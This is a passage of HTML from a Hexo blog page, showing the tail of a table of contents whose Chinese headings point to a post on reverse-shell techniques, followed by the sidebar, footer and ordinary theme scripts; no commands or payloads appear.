+          2.实现attacker上的输入至victim（victim输入重定向）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E7%BB%93%E5%90%88%E4%BB%A5%E4%B8%8A%E4%B8%A4%E6%9D%A1%E6%8C%87%E4%BB%A4"><span class="toc-number">2.1.2.4.</span> <span class="toc-text">
+          3.结合以上两条指令</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E8%AF%AD%E5%8F%A5"><span class="toc-number">3.</span> <span class="toc-text">
+          常见的反弹shell语句</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">3.1.</span> <span class="toc-text">
+          1.方法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">3.2.</span> <span class="toc-text">
+          2.方法二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%96%B9%E6%B3%95%E4%B8%89"><span class="toc-number">3.3.</span> <span class="toc-text">
+          3.方法三</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%96%B9%E6%B3%95%E5%9B%9B"><span class="toc-number">3.4.</span> <span class="toc-text">
+          4.方法四</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">
+          小结</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/20210123130445.png" alt="avatar"></div><p class="sidebar-ov-author__text">tlife</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">38</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>vague huang</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.2.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.1</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">Visitors</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">Views</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.1"></script><script src="/js/stun-boot.js?v=2.6.1"></script><script src="/js/scroll.js?v=2.6.1"></script><script src="/js/header.js?v=2.6.1"></script><script src="/js/sidebar.js?v=2.6.1"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>
